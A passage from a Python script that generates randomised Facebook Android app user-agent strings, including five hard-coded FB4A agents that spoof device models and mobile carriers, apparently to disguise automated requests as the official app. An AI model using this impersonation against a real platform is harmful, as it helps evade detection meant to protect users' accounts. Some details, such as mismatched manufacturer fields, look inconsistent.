	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/hauwei;FBBD/hauwei;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
	return random.choice([user_agent1,user_agent2])       
def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/484.0.4.586;FBBV/59730098;FBDM/{{density=1.1,width=1440,height=1280}};FBLC/en_US;FBRV/575891847;FBCR/Airtel;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua2 = "[FBAN/FB4A;FBAV/447.5.5.236;FBBV/89194672;FBDM/{{density=3.0,width=720,height=1280}};FBLC/en_US;FBRV/108629097;FBCR/unknown;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua3 = "[FBAN/FB4A;FBAV/432.8.3.967;FBBV/87368674;FBDM/{{density=3.7,width=1080,height=1920}};FBLC/en_US;FBRV/191024825;FBCR/Banglalink;FBMF/lge;FBBD/huawei;FBPN/com.facebook.katana;FBDV/LGE;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua4 = "[FBAN/FB4A;FBAV/365.9.4.616;FBBV/33289272;FBDM/{{density=2.8,width=1440,height=1280}};FBLC/en_US;FBRV/404964255;FBCR/Banglalink;FBMF/lge;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua5 = "[FBAN/FB4A;FBAV/370.4.4.320;FBBV/96888636;FBDM/{{density=1.8,width=1440,height=1920}};FBLC/en_US;FBRV/837918886;FBCR/Airtel;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)
if __name__ == "__main__":
    Mr_Code().Main()
